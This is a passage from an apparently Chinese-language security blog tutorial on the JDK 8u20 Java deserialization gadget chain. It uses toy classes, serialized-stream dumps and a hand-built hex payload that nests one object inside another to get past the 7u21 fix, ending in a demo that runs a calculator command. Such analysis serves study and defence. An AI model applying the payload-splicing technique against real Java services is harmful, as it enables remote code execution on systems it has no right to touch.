input.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.zero==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">double</span> result = <span class="number">1</span>/<span class="keyword">this</span>.zero;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Hack !!!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"your number is error!!!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanContextSupport</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">20L</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个类：A有throw，B没有throw</p><p>如果我们反序列化A，肯定会报错。</p><p>因为A的readObject首先会执行<code>input.defaultReadObject()</code>，这句话其实的意思就是从序列化流里面取出一个对象，然后执行他的默认序列化，就是给字段赋值。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210717164640363.png" alt="image-20210717164640363" style="zoom:50%;"><p>这里<code>this</code>其实就是<code>AnnotationInvocationHandler</code>对象了，当我们执行完<code>input.defaultReadObject</code>的时候，其实zero字段已经被赋值为0了。</p><p>所以会进入if，除数为0，引发异常，<strong>但是我们的AnnotationInvocationHandler对象已经序列化成功了</strong>。</p><p>我们看一下序列化好的payload1文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 49 - 0x00 31</span><br><span class="line">        Value - com.fxc.bautwentycase.AnnotationInvocationHandler - 0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572</span><br><span class="line">      serialVersionUID - 0x00 00 00 00 00 00 00 0a</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 1 - 0x00 01</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 4 - 0x00 04</span><br><span class="line">            Value - zero - 0x7a65726f</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 01</span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.bautwentycase.AnnotationInvocationHandler</span><br><span class="line">        values</span><br><span class="line">          zero</span><br><span class="line">            (int)0 - 0x00 00 00 00</span><br></pre></td></tr></table></figure><p>我们要知道为什么7u21修复之后就失效了？</p><p>是因为<strong>在catch块中，修复前没有throw，修复之后多了throw！！！！</strong></p><p>也就是说，<strong>修复之后，异常被throw，进程被终止掉，我们的反序列化对象也被销毁掉，导致反序列化失败</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改之前</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改之后</span></span><br><span class="line">AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    annotationType = AnnotationType.getInstance(type);</span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们希望的是就算有异常，不要有throw，catch就好了，这样可以保证我们的反序列化对象还是存在的。</p><p>所以来到上一个小实验，如果我们希望绕过<code>if(this.zero==0){</code>这个判断：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">10L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> zero;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AnnotationInvocationHandler</span><span class="params">(<span class="keyword">int</span> zero)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.zero = zero;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Process shell = Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.zero==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">double</span> result = <span class="number">1</span>/<span class="keyword">this</span>.zero;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"Hack !!!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"your number is error!!!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在换一个思路，A类的readObject一定会throw一个异常，我们能做的就是希望这个exception不要影响我们对象的序列化进程。</p><p>想到之前的分析：</p><p><strong>我们可以在A的throw外面再套一个<code>try-catch</code>：</strong></p><p>也就是说，<strong>你A可以随便throw Exception，我只要外面catch住就可以了，进程不受影响。</strong></p><p>这也是为什么B类存在的原因。</p><p>重点看B：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanContextSupport</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">20L</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B的特点就是<strong>在本身的readObject里面又调用了下一个流中对象的readObject</strong></p><p>梳理一下，我们现在需要的是==把A序列化好的hex插入到B中==</p><p>这样B在反序列化的时候：</p><ul><li><code>input.defaultReadObject();</code> 反序列化出来的是B自身对象</li><li><code>input.readObject</code>反序列化出来的就是A的对象，会报错，但是会被B catch 住，==不影响反序列化对象在内存中的存在==</li></ul><p>所以A的序列化文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">49</span> - <span class="number">0x00</span> <span class="number">31</span></span><br><span class="line">        Value - com.fxc.bautwentycase.AnnotationInvocationHandler - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a</span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">      Fields</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Int - I - <span class="number">0x49</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - zero - <span class="number">0x7a65726f</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.bautwentycase.AnnotationInvocationHandler</span><br><span class="line">        values</span><br><span class="line">          zero</span><br><span class="line">            (<span class="keyword">int</span>)<span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>B的序列化文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">40</span> - <span class="number">0x00</span> <span class="number">28</span></span><br><span class="line">        Value - com.fxc.bautwentycase.BeanContextSupport - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e4265616e436f6e74657874537570706f7274</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">    classdata</span><br><span class="line">      com.fxc.bautwentycase.BeanContextSupport</span><br><span class="line">        values</span><br></pre></td></tr></table></figure><p>再重复一遍：==A插入到B中==</p><p>插入到哪里？自然是<code>objectAnnotation</code>中了</p><p>前面我省略了，重点看插入后的<code>classdata</code>部分，最终版</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">40</span> - <span class="number">0x00</span> <span class="number">28</span></span><br><span class="line">        Value - com.fxc.bautwentycase.BeanContextSupport - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e4265616e436f6e74657874537570706f7274</span></span><br><span class="line">      serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">      newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">00</span> <span class="comment">//类对象</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE <span class="comment">//修改</span></span><br><span class="line">      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">01</span> <span class="comment">// 实际对象</span></span><br><span class="line">    classdata</span><br><span class="line">      com.panda.sec.BeanContextSupport</span><br><span class="line">        values</span><br><span class="line">    objectAnnotation       <span class="comment">//     从这里开始</span></span><br><span class="line">      TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">        TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">          className</span><br><span class="line">            Length - <span class="number">49</span> - <span class="number">0x00</span> <span class="number">31</span></span><br><span class="line">            Value - com.fxc.bautwentycase.AnnotationInvocationHandler - <span class="number">0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572</span></span><br><span class="line">          serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a</span><br><span class="line">          newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">02</span>   <span class="comment">// 记得按顺序修改</span></span><br><span class="line">          classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">          fieldCount - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">          Fields</span><br><span class="line">            <span class="number">0</span>:</span><br><span class="line">              Int - I - <span class="number">0x49</span></span><br><span class="line">              fieldName</span><br><span class="line">                Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">                Value - zero - <span class="number">0x7a65726f</span></span><br><span class="line">          classAnnotations</span><br><span class="line">            TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">          superClassDesc</span><br><span class="line">            TC_NULL - <span class="number">0x70</span></span><br><span class="line">        newHandle <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">        classdata</span><br><span class="line">          com.fxc.bautwentycase.AnnotationInvocationHandler</span><br><span class="line">            values</span><br><span class="line">              zero</span><br><span class="line">                (<span class="keyword">int</span>)<span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span> <span class="comment">// 标志着对象结束</span></span><br><span class="line">  TC_REFERENCE - <span class="number">0x71</span></span><br><span class="line">    Handle - <span class="number">8257539</span> - <span class="number">0x00</span> <span class="number">7</span>e <span class="number">00</span> <span class="number">03</span> <span class="comment">//记得加最后一个句柄</span></span><br></pre></td></tr></table></figure><p><code>8257539</code>怎么来的？</p><p>当然是逆<code>SerializationDumper</code>看源码抄的\doge：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">num</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> b1 = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">byte</span> b2 = <span class="number">126</span>;</span><br><span class="line">        <span class="keyword">byte</span> b3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">byte</span> b4 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">int</span> handle = (</span><br><span class="line">                ((b1 &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xff000000</span>) +</span><br><span class="line">                        ((b2 &lt;&lt; <span class="number">16</span>) &amp;   <span class="number">0xff0000</span>) +</span><br><span class="line">                        ((b3 &lt;&lt;  <span class="number">8</span>) &amp;     <span class="number">0xff00</span>) +</span><br><span class="line">                        ((b4      ) &amp;       <span class="number">0xff</span>)</span><br><span class="line">        );</span><br><span class="line">        System.out.println(<span class="string">"Handle - "</span> + handle + <span class="string">" - 0x"</span> + byteToHex(b1) + <span class="string">" "</span> + byteToHex(b2) + <span class="string">" "</span> + byteToHex(b3) + <span class="string">" "</span> + byteToHex(b4));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们的payload梳理一下就是这个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aced <span class="number">0005</span> <span class="number">7372</span> <span class="number">0028</span> <span class="number">636f</span> <span class="number">6</span>d2e <span class="number">6678</span> <span class="number">632</span>e</span><br><span class="line"><span class="number">6261</span> <span class="number">7574</span> <span class="number">7765</span> <span class="number">6e74</span> <span class="number">7963</span> <span class="number">6173</span> <span class="number">652</span>e <span class="number">4265</span></span><br><span class="line"><span class="number">616</span>e <span class="number">436f</span> <span class="number">6e74</span> <span class="number">6578</span> <span class="number">7453</span> <span class="number">7570</span> <span class="number">706f</span> <span class="number">7274</span></span><br><span class="line"><span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0014</span> <span class="number">0300</span> <span class="number">0078</span> <span class="number">7073</span> <span class="number">7200</span></span><br><span class="line"><span class="number">3163</span> <span class="number">6f</span>6d <span class="number">2e66</span> <span class="number">7863</span> <span class="number">2e62</span> <span class="number">6175</span> <span class="number">7477</span> <span class="number">656</span>e</span><br><span class="line"><span class="number">7479</span> <span class="number">6361</span> <span class="number">7365</span> <span class="number">2e41</span> <span class="number">6e6</span>e <span class="number">6f</span>74 <span class="number">6174</span> <span class="number">696f</span></span><br><span class="line"><span class="number">6e49</span> <span class="number">6e76</span> <span class="number">6f</span>63 <span class="number">6174</span> <span class="number">696f</span> <span class="number">6e48</span> <span class="number">616</span>e <span class="number">646</span>c</span><br><span class="line"><span class="number">6572</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">000</span>a <span class="number">0200</span> <span class="number">0149</span> <span class="number">0004</span></span><br><span class="line"><span class="number">7</span>a65 <span class="number">726f</span> <span class="number">7870</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">7871</span> <span class="number">007</span>e <span class="number">0003</span></span><br></pre></td></tr></table></figure><p>攻击一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Attack</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload"</span>));</span><br><span class="line">        <span class="comment">// 第一层</span></span><br><span class="line">        System.out.println(ois.readObject().toString());</span><br><span class="line">        AnnotationInvocationHandler a = (AnnotationInvocationHandler) ois.readObject();</span><br><span class="line">        <span class="comment">// 第二层</span></span><br><span class="line">        System.out.println(a.toString());</span><br><span class="line">        a.exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210717183158101.png" alt="image-20210717183158101" style="zoom:50%;"><p>并且可以发现：[B(A)]</p><p>我们把A塞进了B之中，所以第一个反序列化出来的是B对象，第二个反序列化出来的是A对象。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>经过<a href="https://xz.aliyun.com/t/7240#toc-3" target="_blank" rel="noopener">这篇</a>的分析:</p><blockquote><p>当我们序列化一个对象的时候，每次在写入序列化对象的时候，都会调用<code>handles.lookup</code>方法来判断该对象是否已经写入了，如果已经写入了，那么就会调用<code>writeHandle(h)</code>来写入引用类型标识和handle引用值<code>0x7e0000+handle</code></p></blockquote><p>在之前的7u21中</p><p>序列化顺序：HashSet.writeObject -&gt; AnnotationInvocationHandler.defaultWriteFields</p><p>反序列化顺序：HashSet.readObject -&gt; AnnotationInvocationHandler.readObject</p><p>但是在8u20中，AnnotationInvocationHandler.readObject限制了this.type必须是注解类型才可以。</p><p>如果不是的话，会抛出异常。</p><p>这个异常如果在反序列化过程当中被抛出，外层的HashSet也并没有catch处理，所以会报错。</p><p>所以我们需要找到一个类，除了最基本的序列化条件，还需要满足：</p><ul><li>重写了readObject方法</li><li>在自身的readObject方法中，还存在readObject方法的调用，并且对第二次的readObject方法存在异常的catch。</li></ul><p>JRE8u20 中利用到了名为 BeanContextSupport 类。</p><p>这个类满足以上条件，负责来帮我们绕过的。</p><p>看一下BeanContextSupport的readObject源码：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194016263.png" alt="image-20210521194016263" style="zoom: 85%;"><p>进入readChildren方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194127997.png" alt="image-20210521194127997" style="zoom:85%;"><p>发现这里读去了流中的下一个对象，并且出现异常仅仅是catch，<strong>并没有throw</strong>，符合构造条件。</p><p><strong>在执行<code>ois.readObject()</code>时,这里try-catch了,但是没有把异常抛出来,程序会接着执行。</strong></p><p>如果这里可以把<code>AnnotationInvocationHandler</code>对象在<code>BeanContextSupport</code>类第二次writeObject的时候写入，这样反序列化时，即使<code>AnnotationInvocationHandler</code>对象 this.type的值为<code>Templates</code>类型也不会报错。</p><blockquote><p>反序列化还有两点就是:</p><p>1.反序列化时类中没有这个成员，依然会对这个成员进行反序列化操作，但是之后会抛弃掉这个成员。</p><p>2.每一个新的对象都会分配一个newHandle的值，newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用<code>TC_REFERENCE</code>结构，引用前面handle的值。</p></blockquote><p>在之前的<a 